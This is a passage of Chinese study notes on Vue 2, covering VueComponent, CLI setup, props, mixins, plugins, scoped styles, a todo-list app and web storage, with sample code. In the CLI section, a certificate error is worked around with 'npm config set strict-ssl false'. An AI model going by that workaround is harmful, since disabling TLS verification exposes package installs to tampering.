                data() {
                    return {
                        schoolName: '人民大学',
                        address: '北京'
                    }
                },
                methods: {
                    showName() {
                        console.log('showName',this);
                        alert(this.schoolName);
                    }
                }
            });


            //局部注册，此在创建Vue实例对象中
            new Vue({
                el: '#root',
                //此为局部注册组件
                components: {
                    school: school
                }
            });
        </script>
    </body>

</html>
```

输出：

![image-20250105210520350](.\images\image-20250105210520350.png)

>关于VueComponent：
>1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
>
>2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
>即Vue帮我们执行的：new VueComponent(options)。
>
>3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
>
>4.关于this指向：
>(1).组件配置中：
>data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
>(2).new Vue(options)配置中：
>data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
>
>5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
>Vue的实例对象，以后简称vm。





#### 1.17.5 关于Vue与VueComponent关系

```html
<!DOCTYPE html>
<html>

<body>

    <head>
        <meta charset="UTF-8" />
        <title>VUE-自定义标签-VueComponent</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>

    <body>
        <!-- 
          Vue.extend = function (extendOptions) {
          ......
          //定义子类构造函数
          var Sub = function VueComponent(options) {
              this._init(options);
          };
          //创建一个新的对象并赋值给原型链
          Sub.prototype = Object.create(Super.prototype);
          //修正子类的构造函数引用
          Sub.prototype.constructor = Sub;
          Sub.cid = cid++;
          ......
          return Sub;
      };
  }

        -->

        <div id="root">
            <school></school>
        </div>


        <script type="text/javascript">
            //阻止 vue 在启动时生成生产提示。
            Vue.config.productionTip = false


            //第一步创建学校组件
            const school = Vue.extend({
                template: `
                <div>
                    <h2>学校名称：{{schoolName}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <button @click="showName">点我提示学校名</button>	 
                    <hr/>
                </div>`,
                data() {
                    return {
                        schoolName: '人民大学',
                        address: '北京'
                    }
                },
                methods: {
                    showName() {
                        console.log('showName',this);
                        alert(this.schoolName);
                    }
                }
            });


            //局部注册，此在创建Vue实例对象中
            new Vue({
                el: '#root',
                //此为局部注册组件
                components: {
                    school: school
                }
            });
        </script>
    </body>

</html>
```

结果：

	关于VueComponent：
	1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
	2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
	即Vue帮我们执行的：new VueComponent(options)。
	3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
	
	4.关于this指向：
	(1).组件配置中：
	data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
	(2).new Vue(options)配置中：
	data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
	
	5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
	Vue的实例对象，以后简称vm。





![](.\images\内置关系20250105_224251789.jpg)



#### 1.17.6 重要的内置关系

```html
<!DOCTYPE html>
<html>

<body>

    <head>
        <meta charset="UTF-8" />
        <title>VUE-自定义标签-重要的内置关系</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>

    <body>
        <div id="root">
            <school></school>
        </div>


        <script type="text/javascript">
            //阻止 vue 在启动时生成生产提示。
            Vue.config.productionTip = false


            //第一步创建学校组件
            const school = Vue.extend({
                template: `
                <div>
                    <h2>学校名称：{{schoolName}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <button @click="showName">点我提示学校名</button>	 
                    <hr/>
                </div>`,
                data() {
                    return {
                        schoolName: '人民大学',
                        address: '北京'
                    }
                },
                methods: {
                    showName() {
                        console.log('showName',this);
                        alert(this.schoolName);
                    }
                }
            });


            //局部注册，此在创建Vue实例对象中
            new Vue({
                el: '#root',
                //此为局部注册组件
                components: {
                    school: school
                }
            });

            //1,定义一个构造函数
            function Demo(){
                this.a = 1;
                this.b = 2;
            }

            //创建一个Demo的实例对象
            const d = new Demo();

            //显示原型属性
            console.log(Demo.prototype);

            //隐式原型属性
            console.log(d.__proto__);
        
            console.log(Demo.prototype === d.__proto__);

            //通过显示原型属性操作原型对象，追加一个X属性，值为99
            Demo.prototype.x = 99;

            console.log('@',d);

        </script>
    </body>

</html>
```

输出信息

![image-20250106200021057](.\images\image-20250106200021057.png)



### 1.18 单文件组件

```html
```





## 2. VUE脚手架

安装npm

```sh
# 在安装目录下新建两个文件夹【node_global】和【node_cache】

 npm config set prefix "D:\soft\dev\node-v18.19.0\nodejs\node_global"       //路径改为自己的
 npm config set cache "D:\soft\dev\node-v18.19.0\nodejs\node_cache"         //路径改为自己的
 
 
 # 检查配制是否成功
 npm config get prefix
 npm config get cache
 
```





```sh

# 如出现下载缓慢请配置 npm 淘宝镜像
npm config set registry https://registry.npm.taobao.org

# 全局安装@vue/cli。
npm install -g @vue/cli


# 切换到要创建项目的目录，使用以下命令创项目
vue create xxxx

# 启动项目
vue run serve
```

错误：

```sh
#D:\soft\dev\vue>npm install -g @vue/cli
npm error code CERT_HAS_EXPIRED
npm error errno CERT_HAS_EXPIRED
npm error request to https://registry.npm.taobao.org/@vue%2fcli failed, reason: certificate has expired
npm error A complete log of this run can be found in: C:\Users\Maxwell\AppData\Local\npm-cache\_logs\2025-01-07T02_35_34_270Z-debug-0.log


# 解决办法
npm config set strict-ssl false
```

### 2.1 hello-word

准备一个容器页面

```html
<!DOCTYPE html>
<html>
<body>
    <head>
        <meta charset="UTF-8" />
        <title>VUE-组件练习</title>
    </head>
    <body>
        <div id="app">
        </div>
    </body>
</html>
```

引入App.js

```js
import Vue from 'vue'
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

new Vue({
   el: '#app',
   render: h => h(App)
});
```

引入核心组件App.vue

```vue
<template>
    <div>
        <School></School>
        <Student></Student>
    </div>
</template>

<script>
//引入组件
import School from './components/School'
import Student from './components/Student'

export default{
    name: 'App',
    components:{
        School,
        Student
    }
}
</script>

```

School.vue

```vue
<template>
  <div class="school-style">
    <h2>学校名称：{{ name }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="showName">点我提示学校信息</button>
  </div>
</template>

<script>
export default {
  name: "SchoolData",
  data() {
    return {
      name: "nullnull",
      address: "上海"
    };
  },
  methods: {
    showName() {
      alert("学校名称:" + this.name);
    },
  },
};
</script>

<style>
.school-style {
  background-color: blue;
}
</style>


```

学生的Student.vue

```vue
<template>
  <div>
    <h2>学生姓名：{{ name }}</h2>
    <h2>学生年龄：{{ age }}</h2>
  </div>
</template>

<script>
export default {
  name: "StudentData",
  data() {
    return {
      name: "张三",
      age: 19,
    };
  },
};
</script>


```

进行编译

```sh
npm run serve
```

打开浏览器访问：

![image-20250107202424076](.\images\image-20250107202424076.png)

### 2.2 VUE架手架

```
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

#### 2.2.1 关于不同版本的Vue

1. vue.js与vue.runtime.xxx.js的区别：
   1. vue.js是完整版的Vue，包含：核心功能 + 模板解析器。
   2. vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。

#### 2.2.2 vue.config.js配置文件

1. 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh



### 2.3 ref属性

组件

componets\School.vue

```vue
<template>
  <div class="school">
    <h2>学校名称: {{ name }}</h2>
    <h2>学校地址: {{ address }}</h2>
  </div>
</template>

<script>
export default {
    name: 'School',
    data() {
        return {
            name: '交大',
            address: '闵行'
        }
    },
};
</script>

<style>
.school {
  background-color: gray;
}
</style>
```

App.vue

```vue
<template>
  <div>
     <h1 v-text="msg" ref="title"></h1>
     <button ref="btn" @click="showDom">点击显示元素</button>
     <School ref="sch"/>
  </div>
</template>

<script>
//引入组件
import School from './componets/School.vue';


export default {
  name: 'App',
  components: {
    School
  },
  data(){
    return {
      msg: '欢迎学习Vue'
    }
  },
  methods: {
    showDom(){
      //通过ref标签查找元素,类似于document.getElementById
      console.log('title',this.$refs.title);
      console.log('btn',this.$refs.btn);
      console.log('btn',this.$refs.sch);
    }
  },
};
</script>
```

main.js

```js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
  render: h => h(App),
}).$mount('#app')

```

页面效果

![image-20250108201809606](.\images\image-20250108201809606.png)

总结：

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
   1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
   2. 获取：```this.$refs.xxx```





### 2.4  props传递数据

src\components\Student.vue

```html
<template>
    <div>
        <h1>{{msg}}</h1>
        <h2>姓名: {{name}}</h2>
        <h2>年龄: {{myAge}}</h2>
        <h2>性别: {{sex}}</h2>
        <button @click="updateMsg">点我修改年龄</button>
    </div>
</template>

<script>
export default {
    name: "Student",
    data() {
        return {
            msg: '这是一个学生的信息',
            myAge: this.age
        }
    },
    methods: {
        updateMsg(){
            console.log('update');
            this.myAge += 1;
        }
    },
    //1. 简单声明接收
    //props: ['name','age','sex']
    //2. 接收的同时限制类型
    // props:{
    //   name: String,
    //   age: Number,
    //   sex: String  
    // }
    //3, 接收的同时对数据类型、默认值、必要性进行限制
    props:{
        name: {
            //指定name的类型为字符串
            type:String,
            //指定name是必须的
            required:true
        },
        age:{
            type:Number,
            //指定默认值为19
            default: 19
        },
        sex:{
            type:String,
            required:true
        }
    }
    
}
</script>
```

src\App.vue

```html
<template>
  <div>
      <Student name="nullnull" sex="女"  :age="12"/>
  </div>
</template>

<script>
  import Student from './components/Student.vue'

  export default {
    name : 'App',
    components: {Student}
  }
</script>

```

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```

输出：

![image-20250113193647840](.\images\image-20250113193647840.png)

### 2.5 mixins混入

组件

src\components\School.vue

```vue
<template>
    <div>
        <h2 @click="showName">学校名称: {{name}}</h2>
        <h2>学校地址: {{address}}</h2>
    </div>
</template>

<script>
//局部混合
import {hunhe,hunhe2} from '../mixin'

export default {
    name: "School",
    data() {
        return {
            name: '上海交大',
            //当属性出现了局部与全局混合时，局部优先
            address: '闵行'
        }
    },
    //需要注意的是mounteds这类的生命周期的方法，不管是局部，还是全局都会调用
    mounted() {
        console.log("学校的mounted")
    },
    //局部混合
    mixins:[hunhe,hunhe2]
}
</script>
```

src\components\Student.vue

```html
<template>
    <div>
        <h2 @click="showName">姓名: {{name}}</h2>
        <h2>性别: {{sex}}</h2>
    </div>
</template>

<script>
//局部混合
import {hunhe,hunhe2} from '../mixin'

export default {
    name: "Student",
    data() {
        return {
            name: 'nullnull',
            //当属性出现了局部与全局混合时，局部优先
            sex: '男'
        }
    },
    //需要注意的是mounteds这类的生命周期的方法，不管是局部，还是全局都会调用
    mounted() {
        console.log("学生的mounted")
    },
    //局部混合
   mixins:[hunhe,hunhe2]
}
</script>
```

src\App.vue

```vue
<template>
  <div>
      <School/>
      <hr/>
      <Student/>
  </div>
</template>

<script>
  import Student from './components/Student'
  import School from './components/School'

  export default {
    name : 'App',
    components: {Student,School}
  }
</script>
```

src\mixin.js

```javascript
export const hunhe = {
    methods: {
        showName(){
            alert(this.name);
        }
    },
}
export const hunhe2 = {
    data() {
        return {
            x: 100,
            y: 200
        }
    },
}
```

src\main.js

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```

启动服务以查看数据

![image-20250114092646011](.\images\image-20250114092646011.png)



![image-20250114093552497](.\images\image-20250114093552497.png)

4个标签，2个存在局部的mounted方法，所以一共加起来是6次。

全局混入，注意上面的局部混入

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'

//引入混入
import {hunhe,hunhe2} from './mixin'

//关闭Vue的生产提示
Vue.config.productionTip = false

//全局混入
Vue.mixin(hunhe)
Vue.mixin(hunhe2)

//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```

查看

![image-20250114092902725](.\images\image-20250114092902725.png)



### 2.6 plugin 插件

src\components\School.vue

```vue
<template>
    <div>
        <h2>学校名称: {{name | mySlice}}</h2>
        <h2>学校地址: {{address}}</h2>
        <button @click="onTest">测试一下</button>
    </div>
</template>

<script>
export default {
    name: "School",
    data() {
        return {
            name: '上海交大某某校区',
            address: '闵行'
        }
    },
    methods:{
        onTest(){
            this.testHello();
        }
    }
}
</script>
```

src\components\Student.vue

```vue
<template>
    <div>
        <h2>姓名: {{name}}</h2>
        <h2>性别: {{sex}}</h2>
        <input type="text" v-fbind:value="name" />
    </div>
</template>

<script>
export default {
    name: "Student",
    data() {
        return {
            name: 'nullnull',
            sex: '男'
        }
    }
}
</script>
```

src\App.vue

```vue
<template>
  <div>
      <School/>
      <hr/>
      <Student/>
  </div>
</template>

<script>
  import Student from './components/Student'
  import School from './components/School'

  export default {
    name : 'App',
    components: {Student,School}
  }
</script>

```

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import plugin from './plugin'

//关闭Vue的生产提示
Vue.config.productionTip = false


//应用插件
Vue.use(plugin,1,2,3)


//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```

src\plugin.js

```js
export default {
    install(Vue, x, y, z) {
        console.log(x, y, z);
        //定义全局过滤器
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4);
        })

        //定义指令
        Vue.directive('fbind', {
            //指令与元素首次页面加载时
            bind(element, binding) {
                element.value = binding.value;
            },
            //指令所在的元素被插入页面时
            inserted(element, binding) {
                element.focus();
            },
            //指令所在的模块被重新解析时
            updated(element, binding) {
                element.value = binding.value;
            }
        })

        //定义混入
        Vue.mixin({
            data() {
                return {
                    x: 100,
                    y: 200
                }
            }
        })

        //给Vue的原型对象添加一个方法，(vm和vc就都能用了)
        Vue.prototype.testHello = () => {
            alert("测试一下");
        }
    }
}
```

验证

![image-20250114124707125](.\images\image-20250114124707125.png)



### 2.7 scoped（样式冲突）

src\components\School.vue

```vue
<template>
  <div class="demo">
    <h2 title="title">学校名称: {{ name }}</h2>
    <h2>{{ address }}</h2>
  </div>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      name: "交大",
      address: "上海闵行",
    };
  },
};
</script>

<style>
  /* 样式冲突，在不同的组件中使用相同的样式名就会导致样式冲突 */
  .demo {
    background-color: skyblue;
  }
  .title{
    background-color: blue
}
</style>
```

src\components\Student.vue

```vue
<template>
  <div class="demo">
    <h2 title="title">学生姓名:{{name}}</h2>
    <h2>姓名:{{sex}}</h2>
  </div>
</template>

<script>
export default {
    name: 'Student',
    data() {
        return {
            name: 'nullnull',
            sex: '男'
        }
    },
};
</script>

<style>
    /* 样式冲突， */
    .demo{
        background-color: pink;
    }
</style>
```

src\App.vue

```vue
<template>
  <div>
    <h1 class="title">你好啊</h1>
    <School/>
    <hr/>
    <Student/>
  </div>
</template>

<script>

// 由引入的顺序，在冲突时使用哪个样式，后引入的覆盖前面的
import Student from './components/Student.vue'
import School from './components/School.vue'

export default {
    name: 'App',
    components:{
        School,
        Student
    }
}
</script>

<style>
    .title{
        background-color: red
    }
</style>
```

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//关闭Vue的生产提示
Vue.config.productionTip = false


//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```

效果

![image-20250118094046777](.\images\image-20250118094046777.png)

此时便发生了样式冲突，后引入的组件覆盖了前面的样式。

那如何解决？

给每个引入的样式添加scoped属性

```vue
<template>
  <div class="demo">
    <h2 title="title">学校名称: {{ name }}</h2>
    <h2>{{ address }}</h2>
  </div>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      name: "交大",
      address: "上海闵行",
    };
  },
};
</script>

<style scoped>
  /* 样式冲突，在不同的组件中使用相同的样式名就会导致样式冲突,添加scoped */
  .demo {
    background-color: skyblue;
  }
  .title{
    background-color: blue
}
</style>
```

另外一个组件也添加下scoped属性，页面的样式就正常了

![image-20250118094541223](.\images\image-20250118094541223.png)

那是如何做到的？

![image-20250118094708572](.\images\image-20250118094708572.png)

通过给每个组件都生成一个ID，然后样式只对此ID生效。



**总结：**

1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```



### 2.8 todoList

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//关闭Vue的生产提示
Vue.config.productionTip = false


//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```

src\App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 将一个函数传递给子组件 -->
        <NullHeader :addTodoItem="addTodoItem" />
        <NullList
          :todos="todos"
          :checkedTodoBox="checkedTodoBox"
          :deleteTodoBox="deleteTodoBox"
        />
        <NullFooter :todos="todos"
        :checkAllOrNot="checkAllOrNot"
        :cleanFinish="cleanFinish"
         />
      </div>
    </div>
  </div>
</template>

<script>
import NullHeader from "./components/NullHeader.vue";
import NullList from "./components/NullList.vue";
import NullFooter from "./components/NullFooter.vue";

export default {
  name: "App",
  components: { NullHeader, NullList, NullFooter },
  data() {
    return {
      todos: [
        { id: "001", title: "吃饭", done: false },
        { id: "002", title: "睡觉", done: false },
        { id: "003", title: "RC", done: true },
      ],
    };
  },
  methods: {
    addTodoItem(todoItem) {
      this.todos.unshift(todoItem);
    },
    checkedTodoBox(id) {
      console.log("调用了APP中的checkedTodoBox", id);
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done;
        }
      });
    },
    deleteTodoBox(id) {
      this.todos = this.todos.filter((item) => {
        return item.id != id;
      });
    },
    checkAllOrNot(done){
      this.todos.forEach(item => {
        item.done = done;
      })
    },
    cleanFinish()
    {
        this.todos = this.todos.filter(item => {
          return !item.done;
        });
    }

  },
};
</script>

<style>
/*base*/
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
    0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}
.btn:focus {
  outline: none;
}
.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>
```

src\components\NullHeader.vue

```vue
<template>
    <div class="todo-header">
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="userInput"/>
    </div>
</template>

<script>
import {nanoid} from 'nanoid'

export default {
    name: 'NullHeader',
    props: ["addTodoItem"],
    methods: {
        userInput(event){
            //校验数据不能为空
            if(!event.target.value.trim())
            {
                alert('输入不能为空');
                return;
            }
            //将用户输入的信息包装成一个todo对象
            const todoObj = {id: nanoid(),title: event.target.value,done:false};
            //此时必须使用this，才是vc对象。调用receive方法
            //通过APP组件添加一个数据
            this.addTodoItem(todoObj);
            //清空输入
            event.target.value = '';
        }
    }
}
</script>

<style scoped>
	/*header*/
	.todo-header input {
		width: 560px;
		height: 28px;
		font-size: 14px;
		border: 1px solid #ccc;
		border-radius: 4px;
		padding: 4px 7px;
	}

	.todo-header input:focus {
		outline: none;
		border-color: rgba(82, 168, 236, 0.8);
		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
	}
</style>
```

src\components\NullList.vue

```vue
<template>
  <ul class="todo-main">
    <NullItem
      v-for="todoItem in todos"
      :key="todoItem.id"
      :todoItem="todoItem"
      :checkedTodoBox="checkedTodoBox"
	  :deleteTodoBox="deleteTodoBox"
    />
  </ul>
</template>

<script>
import NullItem from "./NullItem.vue";

export default {
  name: "NullFooter",
  components: { NullItem },
  props: ["todos", "checkedTodoBox","deleteTodoBox"],
};
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

src\components\NullItem.vue

```vue
<template>
  <li>
    <label>
      <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" />
	  <!-- 如下代码也能实现功能，但不推荐，违反了原则，因为修改了props中的值 -->
	  <!-- <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" /> -->
      <span>{{todoItem.title}}</span>
    </label>
    <button class="btn btn-danger" @click="deleteHandler(todoItem.id)">删除</button>
  </li>
</template>

<script>
export default {
  name: "NullItem",
  //声明接收传递过来的todoItem对象
  props: ["todoItem","checkedTodoBox","deleteTodoBox"],
  methods:{
	checkHandler(id){
		//通知组件将对应的done值取反。
		this.checkedTodoBox(id);
	},
	deleteHandler(id){
		if(confirm('确定删除数据吗?'))
		{
			this.deleteTodoBox(id);
		}
	}
  }
};
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #ddd;
}

/* 鼠标悬浮时进行显示。 */
li:hover button {
  display: block;
}
</style>
```

src\components\NullFooter.vue

```vue
<template>
  <!-- 使用数据集的大小，非0即为true -->
  <div class="todo-footer" v-show="countTotal">
    <label>
      <!-- <input type="checkbox" :checked="isAllChecked" @change="checkAll" /> -->
      <input type="checkbox" v-model="isAllChecked" />
    </label>
    <span>
      <span>已完成{{ countDoneNum }}</span> / 全部{{ countTotal }}
    </span>
    <button class="btn btn-danger" @click="cleanAll">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "NullFooter",
  props: ["todos", "checkAllOrNot","cleanFinish"],
  computed: {
    countTotal() {
      return this.todos.length;
    },
    countDoneNum: {
      get() {
        let num = 0;
        this.todos.forEach((item) => {
          if (item.done) {
            num++;
          }
        });

        return num;
      },
    },
    isAllChecked: {
      get() {
        return this.countTotal == this.countDoneNum && this.countTotal > 0;
      },
      //set在传递时，值就为true或者false，表示选择与未选择
      set(value) {
        this.checkAllOrNot(value);
      },
    },
  },
  methods: {
    // 此使用计算属性来实现更为便捷
    // checkAll(e)
    // {
    //   this.checkAllOrNot(e.target.checked);
    // }
    cleanAll()
    {
      this.cleanFinish();
    }
  },
};
</script>

<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>
```



页面效果

![image-20250118131419013](.\images\image-20250118131419013.png)

**总结**

1. 组件化编码流程：

   ​	(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

   ​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

   ​			1).一个组件在用：放在组件自身即可。

   ​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

   ​	(3).实现交互：从绑定事件开始。

2. props适用于：

   ​	(1).父组件 ==> 子组件 通信

   ​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。



### 2.10 store存储

src\localStoreage.html

```html
<!DOCTYPE html>
<html lang="">

<head>
    <title>localStoreAge</title>
</head>

<body>
    <div id="app">
        <!-- localStorage在浏览器关闭后，数据仍然可以操作，但清空浏览器缓存后，将不再可用 -->
        <button onclick="saveData()">点我保存一个数据</button>
        <button onclick="readData()">点我读取一个数据</button>
        <button onclick="deleteData()">点我删除一个数据</button>
        <button onclick="deleteAllData()">点我清空一个数据</button>
    </div>

    <script text="text/JavaScript">
        let data = { name: 'nullnull', age: 18 }

        // 保存数据的方法
        function saveData() {
            localStorage.setItem('data1', 'hello!!!');
            localStorage.setItem('data2', 666);
            localStorage.setItem('data3', JSON.stringify(data));
        }

        //读取数据
        function readData() {
            console.log(localStorage.getItem('data1'));
            console.log(localStorage.getItem('data2'));

            const result = localStorage.getItem('data3');
            console.log(JSON.parse(result));
        }

        //删除数据
        function deleteData() {
            localStorage.removeItem('data2');
        }

        //清空数据
        function deleteAllData()
        {
            localStorage.clear();
        }

    </script>
</body>
</html>
```

打开网页

![image-20250118175233306](.\images\image-20250118175233306.png)

点击保存

![image-20250118175335715](.\images\image-20250118175335715.png)

读取的数据

![image-20250118175544665](.\images\image-20250118175544665.png)

点击删除数据

![image-20250118175625425](.\images\image-20250118175625425.png)

点击清空后

![image-20250118175658679](.\images\image-20250118175658679.png)





src\sessionStoreage.html

```html
<!DOCTYPE html>
<html lang="">

<head>
    <title>sessionStorage</title>
</head>

<body>
    <div id="app">
        <!-- sessionStorage在浏览器关闭后，数据将不再做保存操作 -->
        <button onclick="saveData()">点我保存一个数据</button>
        <button onclick="readData()">点我读取一个数据</button>
        <button onclick="deleteData()">点我删除一个数据</button>
        <button onclick="deleteAllData()">点我清空一个数据</button>
    </div>

    <script text="text/JavaScript">
        let data = { name: 'nullnull', age: 18 }

        // 保存数据的方法
        function saveData() {
            sessionStorage.setItem('data1', 'hello!!!');
            sessionStorage.setItem('data2', 666);
            sessionStorage.setItem('data3', JSON.stringify(data));
        }

        //读取数据
        function readData() {
            console.log(sessionStorage.getItem('data1'));
            console.log(sessionStorage.getItem('data2'));

            const result = sessionStorage.getItem('data3');
            console.log(JSON.parse(result));
        }

        //删除数据
        function deleteData() {
            sessionStorage.removeItem('data2');
        }

        //清空数据
        function deleteAllData()
        {
            sessionStorage.clear();
        }

    </script>
</body>

</html>
```

保存后查看，与localStoreAge几乎一样。

![image-20250118175937643](.\images\image-20250118175937643.png)

**总结**

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

   1. ```xxxxxStorage.setItem('key', 'value');```
      	该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

   2. ```xxxxxStorage.getItem('person');```

      ​		该方法接受一个键名作为参数，返回键名对应的值。

   3. ```xxxxxStorage.removeItem('key');```

      ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

   4. ``` xxxxxStorage.clear()```

      ​		该方法会清空存储中的所有数据。

4. 备注：

   1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
   2. LocalStorage存储的内容，需要手动清除才会消失。
   3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
   4. ```JSON.parse(null)```的结果依然是null。



### 2.11 todolist添加localStore的存储

src\App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 将一个函数传递给子组件 -->
        <NullHeader :addTodoItem="addTodoItem" />
        <NullList
          :todos="todos"
          :checkedTodoBox="checkedTodoBox"
          :deleteTodoBox="deleteTodoBox"
        />
        <NullFooter
          :todos="todos"
          :checkAllOrNot="checkAllOrNot"
          :cleanFinish="cleanFinish"
        />
      </div>
    </div>
  </div>
</template>

<script>
import NullHeader from "./components/NullHeader.vue";
import NullList from "./components/NullList.vue";
import NullFooter from "./components/NullFooter.vue";

export default {
  name: "App",
  components: { NullHeader, NullList, NullFooter },
  data() {
    return {
      //将数据存储至localStorage中
      todos: JSON.parse(localStorage.getItem("todos")) || [],
    };
  },
  methods: {
    addTodoItem(todoItem) {
      this.todos.unshift(todoItem);
    },
    checkedTodoBox(id) {
      console.log("调用了APP中的checkedTodoBox", id);
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done;
        }
      });
    },
    deleteTodoBox(id) {
      this.todos = this.todos.filter((item) => {
        return item.id != id;
      });
    },
    checkAllOrNot(done) {
      this.todos.forEach((item) => {
        item.done = done;
      });
    },
    cleanFinish() {
      this.todos = this.todos.filter((item) => {
        return !item.done;
      });
    },
  },
  watch: {
    // 当检测到数据改变时，将数据进行保存至localStorage操作
    todos: {
      deep: true,
      handler(value) {
        localStorage.setItem('todos',JSON.stringify(value))
      },
    },
  },
};
</script>

<style>
/*base*/
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
